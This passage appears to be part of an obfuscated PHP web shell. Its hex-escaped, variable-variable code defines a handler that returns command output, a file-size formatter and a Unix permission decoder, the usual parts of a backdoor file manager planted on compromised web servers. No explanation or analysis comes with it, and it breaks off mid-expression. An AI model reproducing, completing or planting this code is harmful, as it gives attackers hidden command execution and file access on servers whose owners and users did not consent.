x63\x6f\x6dm\x61n\x64\n";return($▖==""?"↳\x20Q\x75e\x72\x79\x20\x64i\x64\x20\x6eot\x20\x72e\x74u\x72n \x61\x6e\x79thin\x67\n":$▖);}function viewSize($s){${"\x47L\x4fB\x41L\x53"}["\x65\x66\x71i\x61\x62\x6ea\x77f"]="s";${"\x47\x4c\x4fB\x41L\x53"}["\x76frc\x65\x6f\x6b"]="\x73";if(${${"G\x4cO\x42ALS"}["\x77\x71\x72\x6d\x66\x63\x70\x6ct\x6e"]}>=1073741824)return sprintf("\x25\x31\x2e2f",${${"\x47\x4cO\x42\x41\x4c\x53"}["\x77\x71r\x6d\x66\x63p\x6ct\x6e"]}/1073741824)." \x47B";elseif(${${"\x47LOB\x41\x4c\x53"}["\x76\x66\x72\x63eok"]}>=1048576)return sprintf("\x25\x31.2f",${${"\x47\x4cO\x42A\x4c\x53"}["\x77q\x72m\x66\x63\x70ltn"]}/1048576)."\x20MB";elseif(${${"GL\x4f\x42AL\x53"}["\x77qr\x6d\x66\x63\x70ltn"]}>=1024)return sprintf("\x251.2\x66",${${"\x47\x4c\x4f\x42A\x4c\x53"}["\x65\x66\x71\x69a\x62nawf"]}/1024)." \x4bB";else return${${"\x47L\x4fB\x41\x4cS"}["\x77\x71rm\x66\x63p\x6c\x74\x6e"]}." \x42";}function perms($p){${"\x47\x4c\x4f\x42ALS"}["\x63c\x79\x64\x62\x79n\x71"]="i";${"G\x4c\x4fB\x41LS"}["\x72\x79\x67\x6dj\x72\x6a\x67"]="i";$jdcdbfrqcu="p";${"\x47\x4c\x4f\x42\x41L\x53"}["\x69\x71\x69y\x6b\x75nso\x69e"]="\x70";$jctuuby="i";${"G\x4c\x4f\x42A\x4c\x53"}["\x6c\x76\x64\x74\x79\x6c\x66"]="\x69";${"G\x4cOBA\x4cS"}["byeyv\x67\x72\x67e\x64"]="\x70";$ejkwvucfghr="i";${"\x47\x4cO\x42A\x4c\x53"}["\x69\x63ro\x73u"]="i";$dzwsli="p";$lkfmqybd="p";$aajpssbwsf="\x70";$ucheoqbzo="\x70";$lvbvzt="\x69";${"\x47\x4c\x4fBAL\x53"}["k\x6c\x65c\x66\x65"]="\x69";${"GLO\x42AL\x53"}["l\x69g\x66\x68\x76l\x75"]="\x69";$ffssjpli="\x69";$ynimlwfpudwl="\x69";$dwkbqgq="\x69";${"GL\x4f\x42A\x4c\x53"}["e\x6c\x71\x6a\x64g\x65\x75t\x62of"]="\x70";$diwrley="\x70";$zlkoykrr="p";${"\x47\x4c\x4f\x42A\x4c\x53"}["\x71\x78\x68\x64n\x70\x70kt"]="i";if((${$ucheoqbzo}&0xC000)==0xC000)${$ejkwvucfghr}="s";elseif((${$jdcdbfrqcu}&0xA000)==0xA000)${${"\x47\x4c\x4fB\x41\x4cS"}["\x72\x79\x67\x6dj\x72\x6a\x67"]}="\x6c";elseif((${$lkfmqybd}&0x8000)==0x8000)${$lvbvzt}="-";elseif((${$aajpssbwsf}&0x6000)==0x6000)${${"\x47\x